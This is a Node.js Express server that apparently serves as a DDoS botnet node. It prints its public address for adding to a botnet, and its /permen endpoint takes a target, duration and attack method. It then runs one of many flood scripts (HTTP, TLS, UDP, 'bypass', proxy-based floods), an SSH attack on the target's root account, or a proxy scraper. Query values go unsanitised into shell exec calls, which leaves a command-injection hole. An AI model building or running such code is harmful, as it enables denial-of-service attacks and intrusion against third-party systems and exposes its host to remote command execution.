const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

if (methods === 'kill') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXKill.js ${target} ${time} 100 4`);
} else if (methods === 'strike') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXStrike.js GET ${target} ${time} 30 90 proxy.txt --full`);
} else if (methods === 'bypass') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 95 4 proxy.txt`);
} else if (methods === 'tls') {   
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXTls.js ${target} ${time} 90 4`);
} else if (methods === 'tlsv2') {   
	console.log(`recieved`)
    exec(`node ./lib/cache/TLS.js ${target} ${time} 60 10`);
} else if (methods === 'bomb') {   
	console.log(`recieved`)
    exec(`node ./lib/cache/BOMB.js ${target} ${time} 64 10`);  
} else if (methods === 'ninja') {     
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
} else if (methods === 'mix') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 90 4 proxy.txt`);
    } else if (methods === 'slim') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXSlim.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'storm') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXStrom.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'pidoras') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/Pidoras.js ${target} ${time} 64 10 proxy.txt`);
    } else if (methods === 'glory') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/Gloryv2.js ${target} ${time} 64 10 proxy.txt`);
    } else if (methods === 'xyn') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/xyn.js ${target} ${time} 64 10 proxy.txt`);
    } else if (methods === 'flood') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/flood.js ${target} ${time} 64 10 proxy.txt`);
    } else if (methods === 'thunder') {        
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXThunder.js ${target} ${time} 64 10 proxy.txt`);
} else if (methods === 'raw') {                 
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRaw.js ${target} ${time}`);
    } else if (methods === 'https') {                 
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXHttps.js ${target} ${time}`);
} else if (methods === 'browsers') {             
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXBrowsers.js ${target} ${time} 4 100`);
} else if (methods === 'udp') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXUdp.js ${hostname} ${port} ${time}`);	
} else if (methods === 'rape') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRape.js PermenMD ${time} 4 proxy.txt 64 ${target}`)
} else if (methods === 'ssh') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXSsh.js ${slurp} 22 root ${time}`);
} else if (methods === 'proxy') {                  
	console.log(`recieved`)
    exec(`node ./lib/cache/scrape.js`);
} else {}
});
app.listen(port, () => {
fetchData()
});
